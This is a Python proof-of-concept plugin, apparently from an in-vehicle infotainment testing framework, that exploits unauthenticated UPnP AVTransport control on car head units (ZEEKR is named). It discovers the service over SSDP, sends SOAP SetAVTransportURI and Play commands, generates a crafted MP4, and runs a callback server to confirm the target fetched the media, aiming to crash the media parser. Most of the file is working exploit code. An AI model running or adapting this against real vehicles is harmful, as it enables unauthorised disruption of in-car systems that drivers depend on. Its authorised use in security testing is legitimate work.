"""
PoC Name: UPnP AVTransport Unauthenticated Media Injection DoS
Identifier: CWE-306
Component: Application Stack
Category: Application
Severity: High
CVSS: 7.5
Description: IVI 系统 UPnP AVTransport SOAP 接口无认证，攻击者可通过 SetAVTransportURI+Play 强制 IVI 播放外部媒体并触发媒体解析器崩溃。完整攻击链包含回调验证
Prerequisites: 与目标车机处于同一局域网并放行相关应用层端口
Usage: python3 12_UPnP_AVTransport_Media_Inject.py <args>
"""
import socket
import sys
import time
import threading
import xml.etree.ElementTree as ET
import requests
import os
import struct
from urllib.parse import urljoin, urlparse
from http.server import BaseHTTPRequestHandler, HTTPServer
from iv_plugin_base import IVIVulnerabilityPlugin


class UPnPAVTransportMediaInjectPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-012"
    """
    UPnP AVTransport 未认证媒体注入 DoS PoC
    
    漏洞描述:
    车载 IVI 系统（极氪、ZEEKR 等）未对 UPnP AVTransport 接口实施访问控制。
    攻击者可在同一网络段内，通过 SSDP 广播发现 AVTransport 服务，
    然后通过 SOAP 接口未经认证地调用 SetAVTransportURI + Play 命令，
    强制 IVI 系统从外部加载并播放媒体文件。
    
    完整攻击链：协议未授权访问 → 媒体强制加载 → 媒体解析器崩溃（DoS）
    
    与现有 PoC #17 的区别: 本 PoC 实现完整攻击链：
    - 设置媒体 URI 并发送 Play 指令
    - 本地启动临时 HTTP 服务验证目标是否主动回连（证明执行了播放）
    - 更精确地判断漏洞是否可利用
    """
    meta_poc_name = "UPnP AVTransport Media Inject"
    meta_cve_id = "CWE-306"
    meta_severity = "High"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"


    SERVICE_TYPE = "urn:schemas-upnp-org:service:AVTransport:1"
    CALLBACK_PORT = 18999  # 本地临时服务监听端口

    def __init__(self, target_config, logger=None, media_file=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "UPnP-AVTransport-Unauth-Media-Inject"
        self.results["description"] = (
            "UPnP AVTransport SOAP 接口未认证媒体注入 - "
            "通过 SetAVTransportURI+Play 强制加载外部媒体，可触发媒体解析器崩溃"
        )
        self.callback_received = threading.Event()
        self.httpd = None
        self.media_file = media_file  # 用户指定的媒体文件路径
        self.media_content = None  # 内存中的媒体内容
        self.media_type = "video/mp4"  # 默认媒体类型

    def check_prerequisites(self):
        if not self.target_ip:
            self.logger.error("需要指定目标 IP 地址（参数: ip 或 target_ip）")
        return None  # type: ignore

    # ──────────── Media Preparation ────────────

    def _load_media_file(self):
        """加载媒体文件或生成默认的最小化媒体内容"""
        if self.media_file and os.path.isfile(self.media_file):
            self.logger.info(f"[*] 加载媒体文件: {self.media_file}")
            with open(self.media_file, 'rb') as f:
                self.media_content = f.read()
            # 判断媒体类型
            if self.media_file.lower().endswith(('.jpg', '.jpeg')):
                self.media_type = "image/jpeg"
            elif self.media_file.lower().endswith('.png'):
                self.media_type = "image/png"
            elif self.media_file.lower().endswith(('.mp4', '.m4v')):
                self.media_type = "video/mp4"
            elif self.media_file.lower().endswith('.mov'):
                self.media_type = "video/quicktime"
            return True
        else:
            # 生成最小化的 MP4 文件（可正确识别）
            self.logger.info("[*] 生成最小化 MP4 文件...")
            self.media_content = self._generate_minimal_mp4()
            self.media_type = "video/mp4"
            return True

    def _generate_minimal_mp4(self):
        """生成一个可播放的最小化 MP4 文件"""
        # 生成一个完整的、兼容各种播放器的最小 MP4 文件
        
        # 1. ftyp atom - 文件类型
        ftyp = self._create_ftyp_atom()
        
        # 2. mdat atom - 媒体数据（包含一个有效的 H.264 帧）
        video_data = self._create_video_frame()
        mdat = self._create_atom(b'mdat', video_data)
        
        # 3. moov atom - 元数据信息
        moov = self._create_moov_atom(len(video_data))
        
        return ftyp + mdat + moov

    def _create_atom(self, name, data):
        """创建 MP4 atom"""
        size = len(data) + 8
        return struct.pack('>I', size) + name + data

    def _create_ftyp_atom(self):
        """创建 ftyp atom - 文件类型和兼容性信息"""
        data = (
            b'mp42'  # major_brand
            b'\x00\x00\x00\x00'  # minor_version
            b'mp42isom'  # compatible_brands 1
            b'avc1iso2avc1mp41'  # compatible_brands 2-4
        )
        return self._create_atom(b'ftyp', data)

    def _create_video_frame(self):
        """创建一个有效的 H.264 视频帧（黑色 320x240 视频）"""
        # 这是一个最小的 H.264 NAL 单元序列
        # 包含 SPS + PPS + 关键帧数据
        h264_frame = (
            # NAL Start Code
            b'\x00\x00\x00\x01'
            # SPS (Sequence Parameter Set) - 320x240, baseline profile
            b'\x67\x42\x00\x0a\xff\xe1\x00\x16\x26\x90\x09\x50'
            # NAL Start Code
            b'\x00\x00\x00\x01'
            # PPS (Picture Parameter Set)
            b'\x68\xce\x38\x80'
            # NAL Start Code
            b'\x00\x00\x00\x01'
            # 简单的关键帧数据
        )
        h264_data = b'\x00' * 200 + b'\x80' * 300
        return (h264_frame + h264_data) * 2

    def _create_moov_atom(self, mdat_size):
        """创建 moov atom - 完整的元数据"""
        # mvhd - movie header
        mvhd_data = (
            b'\x00'  # version
            b'\x00\x00\x00'  # flags
            b'\x00\x00\x00\x00'  # creation_time
            b'\x00\x00\x00\x00'  # modification_time
            b'\x00\x00\x03\xe8'  # timescale (1000)
            b'\x00\x00\x00\x64'  # duration (100 = 100ms)
            b'\x00\x01\x00\x00'  # 播放速率 1.0
            b'\x01\x00'  # 音量 1.0
        )
        mvhd_data += b'\x00' * 10  # reserved
        # 矩阵
        mvhd_data += (
            b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
            b'\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00'
        )
        # preview time, preview duration, next track id
        mvhd_data += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02'
        mvhd = self._create_atom(b'mvhd', mvhd_data)
        
        # trak - track atom
        trak = self._create_trak_atom(mdat_size)
        
        # moov 包含 mvhd 和 trak
        moov_content = mvhd + trak
        return self._create_atom(b'moov', moov_content)

    def _create_trak_atom(self, mdat_size):
        """创建 trak atom - 轨道信息"""
        # tkhd - track header
        tkhd_data = (
            b'\x00'  # version
            b'\x00\x00\x0f'  # flags
            b'\x00\x00\x00\x00'  # creation_time
            b'\x00\x00\x00\x00'  # modification_time
            b'\x00\x00\x00\x01'  # track_id = 1
            b'\x00\x00\x00\x00'  # reserved
            b'\x00\x00\x00\x64'  # duration = 100
        )
        tkhd_data += b'\x00' * 8  # reserved
        tkhd_data += (
            b'\x00\x00'  # layer = 0
            b'\x00\x00'  # alternate_group = 0
            b'\x01\x00'  # volume = 1.0
            b'\x00' * 2  # reserved
        )
        # display matrix
        tkhd_data += (
            b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
            b'\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00'
        )
        # width, height (320x240)
        tkhd_data += b'\x01\x40\x00\x00'
        tkhd_data += b'\x00\xf0\x00\x00'
        tkhd = self._create_atom(b'tkhd', tkhd_data)
        
        # edts - edit list
        elst_data = (
            b'\x00'  # version
            b'\x00\x00\x00'  # flags
            b'\x00\x00\x00\x01'  # number_of_entries = 1
            b'\x00\x00\x00\x64'  # track_duration = 100
            b'\x00\x00\x00\x00'  # media_time = 0
            b'\x00\x01\x00\x00'  # media_rate = 1.0
        )
        elst = self._create_atom(b'elst', elst_data)
        edts = self._create_atom(b'edts', elst)
        
        # mdia - media atom
        mdia = self._create_mdia_atom(mdat_size)
        
        # trak 包含 tkhd, edts, mdia
        trak_content = tkhd + edts + mdia
        return self._create_atom(b'trak', trak_content)

    def _create_mdia_atom(self, mdat_size):
        """创建 mdia atom - 媒体信息"""
        # mdhd - media header
        mdhd_data = (
            b'\x00'  # version
            b'\x00\x00\x00'  # flags
            b'\x00\x00\x00\x00'  # creation_time
            b'\x00\x00\x00\x00'  # modification_time
            b'\x00\x00\x03\xe8'  # timescale = 1000
            b'\x00\x00\x00\x64'  # duration = 100
            b'\x15\xc7'  # language = 'und' (undetermined)
            b'\x00\x00'  # quality
        )
        mdhd = self._create_atom(b'mdhd', mdhd_data)
        
        # hdlr - handler
        hdlr_data = (
            b'\x00'  # version
            b'\x00\x00\x00'  # flags
            b'vide'  # handler_type = video
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'  # reserved
            b'VideoHandler\x00'  # name
        )
        hdlr = self._create_atom(b'hdlr', hdlr_data)
        
        # minf - media information
        minf = self._create_minf_atom(mdat_size)
        
        # mdia 包含 mdhd, hdlr, minf
        mdia_content = mdhd + hdlr + minf
        return self._create_atom(b'mdia', mdia_content)

    def _create_minf_atom(self, mdat_size):
        """创建 minf atom - 媒体信息容器"""
        # vmhd - video media header
        vmhd_data = (
            b'\x00'  # version
            b'\x00\x00\x01'  # flags
            b'\x00\x00'  # graphics_mode = 0
            b'\x00\x00\x00\x00\x00\x00'  # opcolor
        )
        vmhd = self._create_atom(b'vmhd', vmhd_data)
        
        # dinf - data information
        dinf = self._create_dinf_atom()
        
        # stbl - sample table
        stbl = self._create_stbl_atom(mdat_size)
        
        # minf 包含 vmhd, dinf, stbl
        minf_content = vmhd + dinf + stbl
        return self._create_atom(b'minf', minf_content)

    def _create_dinf_atom(self):
        """创建 dinf atom - 数据信息"""
        # dref - data reference
        dref_data = (
            b'\x00'  # version
            b'\x00\x00\x00'  # flags
            b'\x00\x00\x00\x01'  # number_of_entries = 1
            b'\x00\x00\x00\x0c'  # entry_size = 12
            b'url '
            b'\x00'  # version
            b'\x00\x00\x01'  # flags (self-contained)
        )
        dref = self._create_atom(b'dref', dref_data)
        return self._create_atom(b'dinf', dref)

    def _create_stbl_atom(self, mdat_size):
        """创建 stbl atom - 样本表"""
        # stsd - sample description
        stsd_data = (
            b'\x00'  # version
            b'\x00\x00\x00'  # flags
            b'\x00\x00\x00\x01'  # number_of_entries = 1
        )
        # avc1 entry
        avc1_entry = (
            b'\x00\x00\x00\x00\x00\x00'  # reserved
            b'\x00\x01'  # data_reference_index = 1
        )
        avc1_entry += b'\x00' * 8  # reserved
        avc1_entry += (
            b'\x01\x40'  # width = 320
            b'\x00\xf0'  # height = 240
            b'\x00\x48\x00\x00'  # horizontal resolution 72 dpi
            b'\x00\x48\x00\x00'  # vertical resolution 72 dpi
            b'\x00\x00\x00\x00'  # reserved
            b'\x00\x01'  # frame count = 1
        )
        # codec name
        codec_name = b'avc1' + b'\x00' * 28
        avc1_entry += codec_name
        avc1_entry += (
            b'\x00\x18'  # depth = 24
            b'\xff\xff'  # color index
        )
        avc1_size = len(avc1_entry) + 8
        stsd_data += struct.pack('>I', avc1_size) + avc1_entry
        stsd = self._create_atom(b'stsd', stsd_data)
        
        # stts - time to sample
        stts_data = (
            b'\x00'  # version
            b'\x00\x00\x00'  # flags
            b'\x00\x00\x00\x01'  # number_of_entries = 1
            b'\x00\x00\x00\x01'  # sample_count = 1
            b'\x00\x00\x00\x64'  # sample_delta = 100
        )
        stts = self._create_atom(b'stts', stts_data)
        
        # stsc - sample to chunk
        stsc_data = (
            b'\x00'  # version
            b'\x00\x00\x00'  # flags
            b'\x00\x00\x00\x00'  # number_of_entries = 0
        )
        stsc = self._create_atom(b'stsc', stsc_data)
        
        # stsz - sample size
        stsz_data = (
            b'\x00'  # version
            b'\x00\x00\x00'  # flags
            b'\x00\x00\x00\x00'  # sample_size = 0 (variable)
            b'\x00\x00\x00\x01'  # number_of_entries = 1
        )
        stsz_data += struct.pack('>I', mdat_size)  # sample sizes
        stsz = self._create_atom(b'stsz', stsz_data)
        
        # stco - chunk offset
        stco_data = (
            b'\x00'  # version
            b'\x00\x00\x00'  # flags
            b'\x00\x00\x00\x01'  # number_of_entries = 1
            b'\x00\x00\x00\x00'  # chunk_offset = 0 (will be at mdat)
        )
        stco = self._create_atom(b'stco', stco_data)
        
        # stbl 包含所有这些 atoms
        stbl_content = stsd + stts + stsc + stsz + stco
        return self._create_atom(b'stbl', stbl_content)

    # ──────────── Callback HTTP Server ────────────

    def _start_callback_server(self):
        """启动 HTTP 服务，提供真实的媒体内容"""
        event = self.callback_received
        media_content = self.media_content or b''
        media_type = self.media_type
        logger = self.logger

        class MediaHTTPHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                path = self.path.lower()
                if 'poc' in path or '.mp4' in path or '.jpg' in path or '.png' in path or '.mov' in path:
                    # 请求媒体内容
                    event.set()
                    self.send_response(200)
                    self.send_header('Content-Type', media_type)
                    self.send_header('Content-Length', str(len(media_content)))
                    self.send_header('Connection', 'close')
                    self.end_headers()
                    self.wfile.write(media_content)
                    logger.info(f"[+] 已向目标发送媒体内容 ({len(media_content)} 字节)")
                else:
                    # 其他请求返回 200
                    event.set()
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b'OK')

            def log_message(self, format, *args):  # type: ignore
                pass  # 静默

        try:
            self.httpd = HTTPServer(("0.0.0.0", self.CALLBACK_PORT), MediaHTTPHandler)
            t = threading.Thread(target=self.httpd.serve_forever)
            t.daemon = True
            t.start()
            self.logger.info(f"[*] 媒体服务器已启动: 端口 {self.CALLBACK_PORT}")
            return True
        except Exception as e:
            self.logger.warning(f"启动媒体服务器失败: {e}")
            return False

    # ──────────── SSDP Discovery ────────────

    def _ssdp_discover(self, timeout=5):
        """SSDP M-SEARCH 发现目标 IP 上的 AVTransport 服务"""
        msg = "\r\n".join([
            "M-SEARCH * HTTP/1.1",
            "HOST: 239.255.255.250:1900",
            'MAN: "ssdp:discover"',
            "MX: 2",
            f"ST: {self.SERVICE_TYPE}",
            "", ""
        ]).encode("utf-8")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.settimeout(3)
        self.logger.info("[1/4] 发送 SSDP M-SEARCH 广播，搜寻 AVTransport 服务...")
        try:
            sock.sendto(msg, ("239.255.255.250", 1900))
            start = time.time()
            while time.time() - start < timeout:
                try:
                    data, addr = sock.recvfrom(65507)
                    text = data.decode(errors="ignore")
                    if addr[0] == self.target_ip and "LOCATION:" in text.upper():
                        for line in text.split("\r\n"):
                            if line.upper().startswith("LOCATION:"):
                                location = line.split(":", 1)[1].strip()
                                self.logger.info(f"[+] 发现 LOCATION: {location}")
                                return location
                except socket.timeout:
                    break
        except Exception as e:
            self.logger.error(f"SSDP 发现异常: {e}")
        finally:
            sock.close()

        # 回退：直接尝试常见 UPnP 端口的描述 URL
        self.logger.info("[*] SSDP 广播未收到响应，尝试直接探测常见 UPnP 端口...")
        for port in [49152, 51807, 1900, 8080, 8081]:
            url = f"http://{self.target_ip}:{port}/upnp/desc"
            try:
                r = requests.get(url, timeout=2)
                if r.status_code == 200 and "AVTransport" in r.text:
                    self.logger.info(f"[+] 直接探测发现 UPnP DESC: {url}")
                    return url
            except Exception:
                pass
        return None

    # ──────────── Parse Control URL ────────────

    def _get_control_url(self, location_url):
        """从设备描述 XML 中提取 AVTransport ControlURL"""
        try:
            resp = requests.get(location_url, timeout=5)
            if resp.status_code != 200:
                return None
            ns_d = "{urn:schemas-upnp-org:device-1-0}"
            root = ET.fromstring(resp.content)
            for svc in root.findall(f".//{ns_d}service"):
                stype = svc.find(f"{ns_d}serviceType")
                curl = svc.find(f"{ns_d}controlURL")
                if stype is not None and curl is not None:
                    if self.SERVICE_TYPE in (stype.text or ""):
                        ctrl = (curl.text or "").strip()
                        parsed = urlparse(location_url)
                        base = f"{parsed.scheme}://{parsed.netloc}"
                        full = urljoin(base + "/", ctrl)
                        self.logger.info(f"[+] AVTransport ControlURL: {full}")
                        return full
        except Exception as e:
            self.logger.error(f"解析设备描述 XML 失败: {e}")
        return None

    # ──────────── SOAP Actions ────────────

    def _soap(self, control_url, action, args):
        inner = "".join(f"<{k}>{v}</{k}>" for k, v in args.items())
        body = f"""<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:{action} xmlns:u="{self.SERVICE_TYPE}">
{inner}
</u:{action}>
</s:Body>
</s:Envelope>"""
        headers = {
            "Content-Type": 'text/xml; charset="utf-8"',
            "SOAPAction": f'"{self.SERVICE_TYPE}#{action}"',
        }
        try:
            r = requests.post(control_url, data=body.encode("utf-8"),
                              headers=headers, timeout=8)
            return r.status_code, r.text
        except Exception as e:
            self.logger.debug(f"SOAP {action} 异常: {e}")
            return None, str(e)

    def _generate_upnp_metadata(self, media_url):
        """生成 UPnP 兼容的媒体元数据（DIDL-Lite 格式）"""
        ext = os.path.splitext(media_url)[1].lower()
        if ext in ['.jpg', '.jpeg']:
            upnp_class = "object.item.imageItem.photo"
            mime = "image/jpeg"
        elif ext in ['.png']:
            upnp_class = "object.item.imageItem.photo"
            mime = "image/png"
        elif ext in ['.mp4', '.m4v', '.mov']:
            upnp_class = "object.item.videoItem.movie"
            mime = "video/mp4"
        else:
            upnp_class = "object.item.videoItem.movie"
            mime = "video/mp4"

        metadata = f'''&lt;DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/" 
xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/" 
xmlns:dc="http://purl.org/dc/elements/1.1/"&gt;
&lt;item id="1" parentID="0" restricted="1"&gt;
&lt;dc:title&gt;POC Media&lt;/dc:title&gt;
&lt;upnp:class&gt;{upnp_class}&lt;/upnp:class&gt;
&lt;res protocolInfo="http-get:*:{mime}:*"&gt;{media_url}&lt;/res&gt;
&lt;/item&gt;
&lt;/DIDL-Lite&gt;'''
        return metadata

    # ──────────── Main Exploit ────────────

    def exploit(self):
        # Step 0: 加载或生成媒体内容
        if not self._load_media_file():
            self.logger.error("[-] 无法加载媒体内容")
            return

        # 获取本机 IP（用于回调 URL）
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.target_ip, 80))
            local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            local_ip = "127.0.0.1"

        # Step 1: 启动媒体服务器
        cb_started = self._start_callback_server()
        
        # 根据媒体类型构造 URL
        media_ext = ".mp4"  # 默认
        if self.media_type == "image/jpeg":
            media_ext = ".jpg"
        elif self.media_type == "image/png":
            media_ext = ".png"
        elif self.media_type == "video/quicktime":
            media_ext = ".mov"
            
        media_url = f"http://{local_ip}:{self.CALLBACK_PORT}/poc{media_ext}"

        # Step 2: 发现 AVTransport
        location = self._ssdp_discover()
        if not location:
            self.logger.warning("[-] 未发现 UPnP AVTransport 服务，目标可能不受影响。")
            self.results["evidence"] = "SSDP 发现失败：未找到 AVTransport 服务"
            if self.httpd:
                self.httpd.shutdown()
            return

        # Step 3: 获取 ControlURL
        self.logger.info("[2/5] 解析设备描述 XML 获取 ControlURL...")
        control_url = self._get_control_url(location)
        if not control_url:
            self.logger.warning("[-] 无法解析 ControlURL，中止检测。")
            self.results["evidence"] = f"LOCATION({location}) 无法解析 AVTransport ControlURL"
            if self.httpd:
                self.httpd.shutdown()
            return

        # Step 4: 发送 SetAVTransportURI（带正确的元数据）
        self.logger.info(f"[3/5] 发送 SetAVTransportURI → {media_url}")
        metadata = self._generate_upnp_metadata(media_url)
        status_set, resp_set = self._soap(
            control_url, "SetAVTransportURI",
            {
                "InstanceID": "0", 
                "CurrentURI": media_url, 
                "CurrentURIMetaData": metadata
            }
        )
        self.logger.info(f"[*] SetAVTransportURI 响应: HTTP {status_set}")

        if status_set != 200:
            self.logger.info("[-] SetAVTransportURI 被拒绝（已认证或不支持），未检测到漏洞。")
            self.results["evidence"] = f"SetAVTransportURI 返回 {status_set}"
            if self.httpd:
                self.httpd.shutdown()
            return

        # 稍作延迟，让设备准备
        time.sleep(0.5)

        # Step 5: 发送 Play
        self.logger.info("[4/5] 发送 Play 指令...")
        status_play, resp_play = self._soap(
            control_url, "Play",
            {"InstanceID": "0", "Speed": "1"}
        )
        self.logger.info(f"[*] Play 响应: HTTP {status_play}")

        # 等待目标回连（最多 10 秒）
        if cb_started:
            self.logger.info("[5/5] 等待目标请求媒体内容（最多 10 秒）...")
            got_callback = self.callback_received.wait(timeout=10)
        else:
            got_callback = False

        # 判断漏洞
        if status_set == 200 and status_play == 200:
            self.results["vulnerable"] = True
            media_size = len(self.media_content) if self.media_content else 0
            evidence = (
                f"UPnP AVTransport 未认证媒体注入确认:\n"
                f"  ControlURL: {control_url}\n"
                f"  媒体 URL: {media_url}\n"
                f"  媒体大小: {media_size} 字节\n"
                f"  媒体类型: {self.media_type}\n"
                f"  SetAVTransportURI: HTTP {status_set} (OK)\n"
                f"  Play: HTTP {status_play} (OK)\n"
                f"  目标回连: {'是（媒体已投送成功！）' if got_callback else '否（但指令已被接受）'}"
            )
            self.results["evidence"] = evidence
            print(f"[!] 【漏洞存在】UPnP AVTransport 未认证媒体注入 - 媒体已投送")
            if got_callback:
                print(f"[!] 【成功】目标已接收媒体内容！")
        elif status_set == 200:
            self.results["vulnerable"] = True
            self.results["evidence"] = (
                f"SetAVTransportURI 被接受 (HTTP 200)，Play 返回 {status_play}。"
                f"\n  媒体 URL: {media_url}\n  ControlURL: {control_url}"
            )
            print(f"[!] 【漏洞存在（部分）】SetAVTransportURI 成功，Play 未成功")
        else:
            self.results["vulnerable"] = False
            self.results["evidence"] = f"SOAP 操作被拒绝或失败: {status_set}"

        if self.httpd:
            self.httpd.shutdown()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 12_UPnP_AVTransport_Media_Inject.py <target_ip> [--media <path>]")
        print("  target_ip:  目标车机 IP 地址")
        print("  --media:    媒体文件路径（支持 .mp4, .jpg, .png, .mov）")
        print("              如不指定，将使用最小化 MP4 文件")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    media_file = None
    
    # 解析 --media 参数
    if "--media" in sys.argv:
        idx = sys.argv.index("--media")
        if idx + 1 < len(sys.argv):
            media_file = sys.argv[idx + 1]
    
    plugin = UPnPAVTransportMediaInjectPlugin({"target_ip": target_ip}, media_file=media_file)
    plugin.run_verify()
